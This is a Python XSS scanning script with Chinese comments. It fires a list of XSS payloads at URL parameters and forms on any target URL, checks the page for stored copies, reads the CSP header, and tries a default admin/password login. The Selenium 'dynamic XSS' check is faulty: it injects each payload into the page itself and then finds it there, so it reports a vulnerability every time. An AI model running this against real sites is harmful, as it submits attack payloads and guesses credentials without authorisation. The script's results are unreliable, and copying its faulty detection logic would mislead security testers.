import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# 获取 XSS 测试载荷
def get_xss_payloads():
    return [
        "<script>alert(1)</script>",
        "'\"><script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        "' onmouseover=alert('XSS') '",
        "<video><source onerror=alert('XSS')></video>",
        "'><svg/onload=alert('XSS')>",
        "'><img src=x onerror=alert(document.domain)>",
    ]

# 分析 CSP 策略
def analyze_csp(headers):
    csp_header = headers.get("Content-Security-Policy")
    if csp_header:
        print(f"[!] 检测到 CSP 防御策略：{csp_header}")
        if "script-src 'self'" in csp_header or "script-src 'none'" in csp_header:
            print("[!] 目标页面可能限制了外部脚本加载，绕过难度较高。")
        else:
            print("[+] 目标页面的 CSP 可能存在绕过漏洞。")
    else:
        print("[+] 未检测到 CSP 防御策略，可能存在 XSS 漏洞。")

# 检测 URL 参数中的反射型 XSS
def detect_url_xss(url, payloads):
    print(f"[+] 开始检测 URL 参数中的反射型 XSS ({url})...")
    vulnerable_urls = []
    for payload in payloads:
        test_url = f"{url}?query={payload}"
        print(f"[DEBUG] 正在访问 URL: {test_url}")
        try:
            response = requests.get(test_url, timeout=10)
            if payload in response.text:
                print(f"[!] 检测到反射型 XSS 漏洞，载荷：{payload}")
                vulnerable_urls.append((test_url, payload))
            else:
                print(f"[-] 未触发 XSS，载荷：{payload}")
        except requests.exceptions.RequestException as e:
            print(f"[!] 请求失败: {e}")
    return vulnerable_urls

# 检测表单中的反射型和存储型 XSS
def detect_form_xss(url, payloads, session=None):
    print(f"[+] 开始检测表单中的反射型和存储型 XSS ({url})...")
    try:
        response = session.get(url, timeout=10) if session else requests.get(url, timeout=10)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[!] 无法访问目标 URL: {e}")
        return []

    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    if not forms:
        print("[!] 页面未检测到任何表单。")
        return []

    vulnerable_forms = []
    for i, form in enumerate(forms, start=1):
        form_method = form.get("method", "get").lower()
        action = form.get("action", "")
        form_url = action if action.startswith("http") else url  # 如果 action 是绝对路径，直接使用

        inputs = form.find_all(["input", "textarea", "select"])
        print(f"\n[+] 检测第 {i} 个表单 (method={form_method}, action={form_url})")

        for payload in payloads:
            form_data = {}
            for input_field in inputs:
                input_name = input_field.get("name")
                input_type = input_field.get("type", "text")
                if input_name:
                    form_data[input_name] = payload if input_type in ["text", "textarea"] else input_field.get("value", "")

            try:
                if form_method == "post":
                    form_response = session.post(form_url, data=form_data, timeout=10) if session else requests.post(form_url, data=form_data, timeout=10)
                else:
                    form_response = session.get(form_url, params=form_data, timeout=10) if session else requests.get(form_url, params=form_data, timeout=10)

                if payload in form_response.text:
                    print(f"[!] 检测到反射型 XSS 漏洞，载荷：{payload}")
                    vulnerable_forms.append((form_url, payload))
                    break

                time.sleep(2)
                stored_response = session.get(url, timeout=10) if session else requests.get(url, timeout=10)
                if payload in stored_response.text:
                    print(f"[!] 检测到存储型 XSS 漏洞，载荷：{payload}")
                    vulnerable_forms.append((form_url, payload))
                    break

            except requests.exceptions.RequestException as e:
                print(f"[!] 请求失败: {e}")
                continue

    return vulnerable_forms

# 使用 Selenium 检测动态加载 XSS
def detect_dynamic_xss_with_selenium(url, payloads):
    print(f"\n[+] 使用 Selenium 模拟动态加载检测 XSS ({url})...")
    options = Options()
    options.add_argument("--headless")  # 无头模式
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-blink-features=AutomationControlled")
    driver = webdriver.Chrome(service=Service(), options=options)

    try:
        driver.get(url)
        wait = WebDriverWait(driver, 20)  # 显式等待 20 秒

        # 等待按钮加载完成
        button = wait.until(EC.presence_of_element_located((By.ID, "load-content")))
        print("[+] 找到按钮，开始模拟点击...")
        button.click()

        # 注入 XSS 载荷
        for payload in payloads:
            driver.execute_script(f"document.getElementById('dynamic-area').innerHTML = '{payload}'")
            if payload in driver.page_source:
                print(f"[!] 检测到动态 XSS 漏洞，载荷：{payload}")
    except Exception as e:
        print(f"[!] 动态加载检测失败: {e}")
    finally:
        driver.quit()

# 模拟登录
def login(url, username, password):
    session = requests.Session()
    try:
        response = session.post(url, data={"username": username, "password": password}, timeout=10)
        if response.status_code == 200 and "欢迎回来" in response.text:
            print("[+] 登录成功")
            return session
        else:
            print("[!] 登录失败，检查用户名或密码")
    except requests.exceptions.RequestException as e:
        print(f"[!] 登录请求失败: {e}")
    return None

# 主程序入口
def main():
    target_url = input("请输入目标 URL: ").strip()
    if not target_url.startswith("http"):
        print("[!] 请输入有效的 URL（包括 http 或 https）。")
        return

    print(f"[+] 开始检测目标 URL: {target_url}")
    payloads = get_xss_payloads()

    # 检测 CSP 策略
    try:
        response = requests.get(target_url, timeout=10)
        response.raise_for_status()
        analyze_csp(response.headers)
    except requests.exceptions.RequestException as e:
        print(f"[!] 无法访问目标 URL: {e}")
        return

    # 检测 URL 参数中的反射型 XSS
    detect_url_xss(target_url, payloads)

    # 检测表单中的存储型 XSS
    session = login(target_url + "/login", "admin", "password")
    if session:
        detect_form_xss(target_url, payloads, session)

    # 使用 Selenium 检测动态加载 XSS
    detect_dynamic_xss_with_selenium(target_url, payloads)

    print("\n[!] 检测完成。")

if __name__ == "__main__":
    main()